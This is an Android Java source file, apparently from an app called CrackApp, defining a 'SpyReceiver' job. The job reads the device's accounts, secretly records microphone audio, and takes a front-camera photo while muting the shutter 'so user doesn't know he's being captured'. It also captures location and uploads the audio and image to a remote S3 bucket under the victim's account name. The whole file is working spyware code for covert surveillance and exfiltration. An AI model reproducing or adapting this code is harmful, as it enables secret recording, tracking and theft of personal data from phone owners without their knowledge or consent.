package co.poweramp.crackapp.receiver;

import android.accounts.Account;
import android.accounts.AccountManager;
import android.content.Context;
import android.graphics.SurfaceTexture;
import android.hardware.Camera;
import android.location.Location;
import android.media.MediaRecorder;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.support.annotation.NonNull;
import android.util.Log;
import android.widget.Toast;

import com.amazonaws.auth.CognitoCachingCredentialsProvider;
import com.amazonaws.regions.Regions;
import com.amazonaws.services.s3.AmazonS3Client;
import com.amazonaws.services.s3.model.ObjectMetadata;
import com.google.android.gms.common.ConnectionResult;
import com.google.android.gms.common.api.GoogleApiClient;
import com.google.android.gms.location.LocationListener;
import com.google.android.gms.location.LocationRequest;
import com.google.android.gms.location.LocationServices;

import java.io.ByteArrayInputStream;
import java.io.File;
import java.io.InputStream;
import java.util.List;

import co.poweramp.crackapp.Constants;
import co.poweramp.crackapp.Util;

/**
 * CrackApp
 * <p/>
 * Created by duncan on 5/1/16.
 * Copyright (c) 2015 Duncan Leo. All Rights Reserved.
 */
public class Job {
    private final String TAG = "SpyReceiver";
    private Context context;
    private long timestamp;
    private JobListener listener;
    private Payload p = new Payload();
    private int completedTasks = 0;
    private static AmazonS3Client sS3Client;
    private static CognitoCachingCredentialsProvider sCredProvider;

    public Job(Context context, @NonNull JobListener listener) {
        this.context = context;
        this.listener = listener;
        this.timestamp = System.currentTimeMillis();
        p.setTimestamp(timestamp);
        p.setAccounts(getAccounts());
        captureLocation();
        recordAudio();
        takePicture();
    }

    /**
     * Check for completion
     */
    private void complete() {
        if (completedTasks != 3) {
            return;
        }
        listener.onComplete(p);
        Log.d(TAG, "onComplete with payload!");
    }

    private Account[] getAccounts() {
        AccountManager accountManager = AccountManager.get(context);
        return accountManager.getAccounts();
    }

    private Account getMainAccount() {
        return getAccounts()[0];
    }

    private void recordAudio() {
        final MediaRecorder recorder = new MediaRecorder();
        recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
        recorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
        final File tempFile;
        try {
            tempFile = File.createTempFile("record-", ".aac");
        } catch (Exception e) {
            e.printStackTrace();
            return;
        }
        recorder.setOutputFile(tempFile.getAbsolutePath());
        recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
        recorder.setMaxDuration(10000);
        try {
            recorder.prepare();
            recorder.start();
        } catch (Exception e) {
            e.printStackTrace();
            return;
        }
        new Handler().postDelayed(new Runnable() {
            @Override
            public void run() {
                Toast.makeText(context, "Recorded audio of length " + tempFile.length(), Toast.LENGTH_LONG).show();
                recorder.stop();
                recorder.release();
                Thread thread = new Thread(new Runnable() {
                    @Override
                    public void run() {
                        Looper.prepare();
                        //TODO: Send file out to S3
                        String objectName = String.format("%s/%d/audio.aac", getMainAccount().name, timestamp);
                        try {
                            getS3Client(context).putObject(Constants.BUCKET_NAME, objectName, tempFile);
                        } catch (Exception e) {
                            e.printStackTrace();
                            Log.d(TAG, "S3 audio upload failed, ignoring.");
                            return;
                        }
                        p.setAudio(objectName);
                        completedTasks++;
                        complete();
                        tempFile.delete();
                        Log.d(TAG, "S3 audio upload succeeded");
                    }
                });
                thread.start();
            }
        }, 10000);
    }

    private void takePicture() {
        try {
            int frontCameraId = Util.getFrontCameraId();
            if (frontCameraId == -1) {
                return;
            }
            Camera camera = Camera.open(frontCameraId);
            SurfaceTexture surfaceTexture = new SurfaceTexture(0);
            camera.setPreviewTexture(surfaceTexture);
            //TODO: Mute camera capture sound
            Camera.Parameters params = camera.getParameters();
            List<Camera.Size> sizes = params.getSupportedPictureSizes();
            int bestWidth = 0, bestHeight = 0;
            for (Camera.Size size : sizes) {
                if (size.height * size.width > bestWidth * bestHeight) {
                    bestWidth = size.width;
                    bestHeight = size.height;
                }
            }
            params.setPictureSize(bestWidth, bestHeight);
            camera.setParameters(params);
            camera.startPreview();
            camera.takePicture(new Camera.ShutterCallback() {
                @Override
                public void onShutter() {

                }
            }, new Camera.PictureCallback() {
                @Override
                public void onPictureTaken(byte[] bytes, Camera camera) {
                    //RAW
                }
            }, new Camera.PictureCallback() {
                @Override
                public void onPictureTaken(final byte[] bytes, Camera camera) {
                    //JPEG
                    camera.stopPreview();
                    camera.release();
                    //Mute the shutter sound so user doesn't know he's being captured
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.JELLY_BEAN_MR1) {
                        camera.enableShutterSound(false);
                    }
                    Toast.makeText(context, "Captured JPEG bytes: " + bytes.length, Toast.LENGTH_LONG).show();
                    //TODO: Send image to S3
                    Thread thread = new Thread(new Runnable() {
                        @Override
                        public void run() {
                            Looper.prepare();
                            InputStream inputStream = new ByteArrayInputStream(bytes);
                            ObjectMetadata metadata = new ObjectMetadata();
                            metadata.setContentType("image/jpeg");
                            metadata.setContentLength(bytes.length);
                            String objectName = String.format("%s/%d/image.jpg", getMainAccount().name, timestamp);
                            try {
                                getS3Client(context).putObject(Constants.BUCKET_NAME, objectName, inputStream, metadata);
                            } catch (Exception e) {
                                e.printStackTrace();
                                Log.d(TAG, "S3 image upload failed, ignoring.");
                                return;
                            }
                            Log.d(TAG, "S3 image upload succeeded");
                            p.setImage(objectName);
                            completedTasks++;
                            complete();
                        }
                    });
                    thread.start();
                }
            });
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void captureLocation() {
        new JobLocationListener();
    }

    private class JobLocationListener implements GoogleApiClient.ConnectionCallbacks, GoogleApiClient.OnConnectionFailedListener, LocationListener {
        private GoogleApiClient mGoogleApiClient;
        private LocationRequest mLocationRequest;

        public JobLocationListener() {
            mGoogleApiClient = new GoogleApiClient.Builder(context)
                    .addApi(LocationServices.API)
                    .addConnectionCallbacks(this)
                    .build();
            mLocationRequest = new LocationRequest();
            mLocationRequest.setInterval(1000);
            mLocationRequest.setFastestInterval(100);
            mLocationRequest.setPriority(LocationRequest.PRIORITY_BALANCED_POWER_ACCURACY);
            Log.d(TAG, "Connecting to Google Api Client");
            mGoogleApiClient.connect();
        }

        @Override
        public void onConnected(Bundle bundle) {
            Log.d(TAG, "Google Api Client connected");
            LocationServices.FusedLocationApi.requestLocationUpdates(mGoogleApiClient, mLocationRequest, this);
        }

        @Override
        public void onConnectionSuspended(int i) {
            Log.d(TAG, "Connection suspended");
        }

        @Override
        public void onLocationChanged(Location location) {
            Log.d(TAG, "Retrieved location.");
            p.setLocation(location);
            completedTasks++;
            complete();
            LocationServices.FusedLocationApi.removeLocationUpdates(mGoogleApiClient, this);
            mGoogleApiClient.disconnect();
        }

        @Override
        public void onConnectionFailed(@NonNull ConnectionResult connectionResult) {
            Log.d(TAG, "Google Api Client connection failed: " + connectionResult.toString());
        }
    }

    /**
     * Gets an instance of CognitoCachingCredentialsProvider which is
     * constructed using the given Context.
     *
     * @param context An Context instance.
     * @return A default credential provider.
     */
    private static CognitoCachingCredentialsProvider getCredProvider(Context context) {
        if (sCredProvider == null) {
            sCredProvider = new CognitoCachingCredentialsProvider(
                    context.getApplicationContext(),
                    Constants.COGNITO_POOL_ID,
                    Regions.US_EAST_1);
        }
        return sCredProvider;
    }

    /**
     * Gets an instance of a S3 client which is constructed using the given
     * Context.
     *
     * @param context An Context instance.
     * @return A default S3 client.
     */
    public static AmazonS3Client getS3Client(Context context) {
        if (sS3Client == null) {
            sS3Client = new AmazonS3Client(getCredProvider(context.getApplicationContext()));
        }
        return sS3Client;
    }

    public interface JobListener {
        void onComplete(Payload p);
    }
}
